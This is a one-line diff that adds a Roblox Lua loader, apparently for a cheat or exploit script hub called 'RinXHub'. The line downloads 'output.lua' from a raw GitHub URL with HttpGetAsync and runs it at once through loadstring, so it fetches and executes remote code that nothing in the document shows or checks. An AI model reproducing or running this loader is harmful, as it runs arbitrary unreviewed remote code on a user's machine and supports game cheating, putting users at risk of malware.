@@ -1,0 +1,1 @@
+loadstring(game:HttpGetAsync"https://github.com/RinXHub/Oowo22./raw/main/output.lua")("RinXHub")
